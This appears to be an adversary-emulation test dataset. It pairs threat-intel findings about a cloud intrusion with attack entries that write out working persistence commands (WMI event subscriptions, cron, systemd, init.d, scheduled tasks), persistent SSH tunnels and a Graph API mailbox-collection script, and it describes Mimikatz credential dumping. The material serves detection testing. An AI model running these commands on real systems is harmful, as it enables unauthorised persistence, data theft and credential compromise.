The adversary may have used the VBScript files to exploit vulnerabilities and gain access to credentials, although this is not explicitly stated.

The threat actor stole web session cookies from end user workstations and used them to access cloud resources
The threat actor used accounts with Delegated Administrator rights to access other O365 tenants and created persistence within the environment
Threat actor utilized the Unified Audit Logs to discover and exploit permissions of the company-created Service Principal

Threat actor scanned for external O365 tenants and logged connection attempts in the Windows Event Log

A local account was used by the Threat Actor to establish a SSH tunnel into the internal network environment
The threat actor used both privileged and non-privileged accounts for RDP throughout the environment, depending on the target system
The threat actor obtained Active Directory credentials through domain replication protocols using the Get-ADReplAccount command from DSInternals
Threat actor used the Cookie Editor extension to impersonate the targeted user in the victim's cloud tenants
Threat actor leveraged Shellbags to access Chrome directories and decrypt cookies for impersonation
Threat actor exfiltrated data via the clipboard in an RDP session, potentially to avoid detection
The threat actor used AdFind and standard PowerShell cmdlets to identify permission groups in Active Directory
Credential hopping for obscuring lateral movement and stealing browser cookies for bypassing multifactor authentication

attacks.description: Simulates downloading and executing Mimikatz to extract credentials from LSASS memory using certutil and command-line execution
attacks.expected_behavior: Attempts to download mimikatz.exe from a remote server (fails if unreachable), runs it with commands to extract credentials, then deletes the file. Requires admin rights to access LSASS. In test environment with benign binary, only executes and exits.

attacks.description: Simulates in-memory execution of Mimikatz PowerShell script to extract credentials without writing to disk
attacks.expected_behavior: Downloads and executes a PowerShell script in memory that would load Mimikatz and dump credentials. Fails if server is unreachable. Requires admin rights for LSASS access. No file written to disk.

attacks.description: Simulates advanced in-memory credential theft using Base64-encoded PowerShell command to download and execute Mimikatz with obfuscation
attacks.expected_behavior: Decodes and runs a PowerShell script that downloads Mimikatz and executes privilege escalation and credential dumping commands. The command is encoded to evade detection. Requires admin rights. Sleeps at the end to simulate persistence. In testing, it will fail safely if the host is unreachable.

attacks.description: Retrieve a list of all users on the system, which could be used to identify potential targets for credential theft.

attacks.command: wmic /namespace:\\root\\subscription PATH __EventFilter CREATE Name="UptimeFilter", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 180 AND TargetInstance.SystemUpTime <= 480", QueryLanguage="WQL" && wmic /namespace:\\root\\subscription PATH CommandLineEventConsumer CREATE Name="UptimeConsumer", CommandLine="cmd.exe /c echo PersistenceTest > %TEMP%\\persistence.txt" && wmic /namespace:\\root\\subscription PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name='UptimeFilter'", Consumer="CommandLineEventConsumer.Name='UptimeConsumer'"
attacks.description: Creates a WMI event filter that triggers when system uptime is between 180‑480 seconds and a command‑line consumer that writes a test file to %TEMP%. The binding links them for persistent execution.
attacks.expected_behavior: When the machine’s uptime reaches the 180‑480 second window, the consumer runs and creates %TEMP%\persistence.txt containing the string "PersistenceTest".

attacks.command: wmic /namespace:\\root\\subscription PATH __EventFilter CREATE Name="UptimeFilter2", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 180 AND TargetInstance.SystemUpTime <= 480", QueryLanguage="WQL" && wmic /namespace:\\root\\subscription PATH CommandLineEventConsumer CREATE Name="UptimeConsumer2", CommandLine="powershell -NoProfile -WindowStyle Hidden -Command \"Start-Process notepad.exe\"" && wmic /namespace:\\root\\subscription PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name='UptimeFilter2'", Consumer="CommandLineEventConsumer.Name='UptimeConsumer2'"
attacks.description: Sets up the same uptime filter but uses a PowerShell consumer that silently launches Notepad when the condition is met, demonstrating a more complex payload.
attacks.expected_behavior: During the 180‑480 second uptime window, Notepad is started in a hidden PowerShell process.

attacks.command: wmic /namespace:\\root\\subscription PATH __EventFilter CREATE Name="UptimeFilter3", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 180 AND TargetInstance.SystemUpTime <= 480", QueryLanguage="WQL" && wmic /namespace:\\root\\subscription PATH ActiveScriptEventConsumer CREATE Name="UptimeConsumer3", ScriptingEngine="JScript", ScriptText="var fso = new ActiveXObject('Scripting.FileSystemObject'); var f = fso.CreateTextFile('%TEMP%\\persistence_js.txt', true); f.WriteLine('JS Persistence'); f.Close();" && wmic /namespace:\\root\\subscription PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name='UptimeFilter3'", Consumer="ActiveScriptEventConsumer.Name='UptimeConsumer3'"
attacks.description: Advanced variant that uses an ActiveScriptEventConsumer with JScript to write a file, showing a less common consumer type while still respecting the uptime window.
attacks.expected_behavior: When uptime is within the defined range, the JScript runs and creates %TEMP%\persistence_js.txt containing the text "JS Persistence".

attacks.command: echo '*/1 * * * * root current_uptime=$(awk '\''{print $1}'\'' /proc/uptime); if [ $(echo "$current_uptime >= 180 && $current_uptime <= 480" | bc) -eq 1 ]; then touch /tmp/persistence_test; fi' | sudo tee /etc/cron.d/uptime_job
attacks.description: Basic: Creates cron job to execute command when uptime is between 180-480 seconds
attacks.expected_behavior: Creates /tmp/persistence_test when system uptime is between 3-8 minutes. Cron job persists across reboots.

attacks.command:
sudo bash -c 'cat > /etc/systemd/system/uptime-check.service <<EOF
[Unit]
Description=Uptime Check Service

[Service]
Type=oneshot
ExecStart=/bin/sh -c "current_uptime=\$(awk "{print \\\$1}" /proc/uptime); if [ \$(echo "\$current_uptime >= 180 && \$current_uptime <= 480" | bc) -eq 1 ]; then touch /tmp/persistence_test; fi"
EOF

cat > /etc/systemd/system/uptime-check.timer <<EOF
[Unit]
Description=Run Uptime Check Service

[Timer]
OnBootSec=180s
OnUnitActiveSec=300s

[Install]
WantedBy=timers.target
EOF' && sudo systemctl enable --now uptime-check.timer
attacks.description: Intermediate: Creates systemd timer/service for uptime-based execution
attacks.expected_behavior: Triggers service 180s after boot and every 300s thereafter. Creates test file if uptime is within range.

attacks.command: sudo sh -c 'echo -e "#!/bin/sh\nsleep 180; [ \$(awk -F. '"'"'{print $1}'"'"' /proc/uptime) -le 480 ] && touch /tmp/persistence_test" > /etc/init.d/uptime_script && chmod +x /etc/init.d/uptime_script && update-rc.d uptime_script defaults'
attacks.description: Advanced: Creates init.d script with time-delayed execution
attacks.expected_behavior: Script sleeps 180s after boot, then creates test file if uptime <= 480s. Persists via init system.

attacks.command: powershell -Command "$token = $env:GRAPH_TOKEN; $users = @('user1@contoso.com','user2@contoso.com','user3@contoso.com'); foreach ($u in $users) { $uri = \"https://graph.microsoft.com/v1.0/users/$u/mailFolders/Inbox/messages?$top=10\"; $headers = @{ Authorization = \"Bearer $token\" }; try { $mail = Invoke-RestMethod -Uri $uri -Headers $headers -Method Get -ErrorAction SilentlyContinue; $mail.value | ConvertTo-Json -Depth 3 | Out-File -FilePath \"$env:TEMP\\${($u -replace '@','_')}_mail.json\" } catch { Write-Host \"Failed to collect mail for $u\" } }"

attacks.description: Advanced persistence: creates a scheduled task that runs the SSH tunnel automatically at every user logon. The task runs with highest privileges to ensure the tunnel can bind to the specified local port.
attacks.expected_behavior: A new scheduled task named "LocalSSHtunnel" is registered. On the next logon, Windows launches the ssh command, establishing a persistent tunnel forwarding local port 9000 to 10.0.0.7:22 via the SSH server. The task can be listed with `schtasks /Query /TN "LocalSSHtunnel"`.

attacks.description: Establish a simple SSH local port forwarding tunnel using a local account.
attacks.expected_behavior: Creates a TCP listener on 127.0.0.1:8080 that forwards traffic to 10.0.0.10:80 over the SSH connection.

attacks.description: Uses autossh to maintain a persistent SSH tunnel, restarting automatically if the connection drops.
attacks.expected_behavior: Runs autossh in the background, establishing the forwarding; if the tunnel breaks, autossh automatically reconnects.

attacks.command:
cat <<'EOF' > /etc/systemd/system/ssh-tunnel.service
[Unit]
Description=Persistent SSH Tunnel
After=network.target
[Service]
User=localuser
ExecStart=/usr/bin/ssh -N -L 127.0.0.1:9000:10.0.0.30:22 localuser@10.0.0.5
Restart=on-failure
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload && systemctl enable --now ssh-tunnel.service
attacks.description: Creates a systemd service that runs at boot to maintain an SSH tunnel using a local account.
attacks.expected_behavior: Installs a systemd unit file, reloads the daemon, enables and starts the service; the tunnel stays active across reboots.

attacks.command: powershell -Command "schtasks /create /tn 'Test Task PS' /tr 'cmd /c echo TestPS > $env:TEMP\testps.txt' /sc daily"
attacks.description: Utilizes PowerShell to create a scheduled task. This demonstrates an intermediate approach by leveraging PowerShell for command execution.
attacks.expected_behavior: Creates a new task named 'Test Task PS' that runs daily, appending 'TestPS' to a file in the temp directory.

attacks.description: Deletes the previously created 'Test Task', demonstrating task management. The '/f' force option is used for deletion.
attacks.expected_behavior: The scheduled task 'Test Task' is deleted. Use with caution as it permanently removes tasks without prompting for confirmation.

attacks.description: Open cron table for editing to add a new scheduled task
attacks.expected_behavior: Opens the cron table in the default editor, allowing the user to add a new cron job.

attacks.description: Add a new cron job that executes a command at midnight every day
attacks.expected_behavior: Adds a new cron job that will execute the specified command daily at midnight.

attacks.description: Remove all cron jobs
attacks.expected_behavior: Deletes all cron jobs scheduled for the current user.

attacks.description: Lists all user accounts on the system
attacks.expected_behavior: Displays a list of user accounts

attacks.description: Displays the current username
attacks.expected_behavior: Prints the current user's username

attacks.description: Lists all local groups on the system
attacks.expected_behavior: Displays a list of local groups

attacks.description: Enumerate all user accounts on the system using the getent command.
attacks.expected_behavior: The command will output a list of all user accounts on the system, including their user ID, group ID, and home directory.

attacks.description: Get the user ID of a specific user using the id command.
attacks.expected_behavior: The command will output the user ID of the specified user.

attacks.description: Enumerate all groups on the system using the getent command.
attacks.expected_behavior: The command will output a list of all groups on the system, including their group ID and members.

attacks.command: echo 'echo \"Simulated registry run key triggered at login\"' >> ~/.profile
attacks.description: Appends a benign command to the user's profile to simulate a registry run key equivalent on Linux
attacks.expected_behavior: The command appends a line to ~/.profile that prints a message upon user login. No actual persistence payload is executed beyond the echo statement.

attacks.command: sudo sh -c 'echo \"sleep 60 && echo \\\"Simulated system-wide startup script triggered\\\" >> /etc/profile.d/simulated-runkey.sh\" && chmod +x /etc/profile.d/simulated-runkey.sh'
attacks.description: Creates a system-wide startup script via /etc/profile.d to simulate registry run key persistence with elevated privileges
attacks.expected_behavior: The command creates a script in /etc/profile.d that executes a delayed echo message for all users upon login. Requires root privileges to write to the directory. The script is executable and non-destructive.

attacks.description: Downloads a malicious file using certutil and executes it.
attacks.expected_behavior: Executes the downloaded malicious file.

attacks.description: Creates a malicious file using PowerShell and executes notepad with an argument to write to the file.
attacks.expected_behavior: Creates a file named malicious.txt in the temp directory and opens notepad.

attacks.description: Creates a malicious batch file and executes it using cmd.
attacks.expected_behavior: Creates a batch file named malicious.bat in the temp directory and executes it.

attacks.description: Basic user execution via locally created shell script mimicking a malicious update.
attacks.expected_behavior: Creates a hidden shell script in user cache directory, sets executable permission, and runs it. Output: 'Malicious payload simulated'.

attacks.description: Advanced: Simulates execution of a base64-decoded script, mimicking obfuscated payload delivery.
attacks.expected_behavior: Decodes a base64 string into a shell script, sets execute permissions, and runs it. Outputs benign messages. Represents obfuscation common in real attacks.
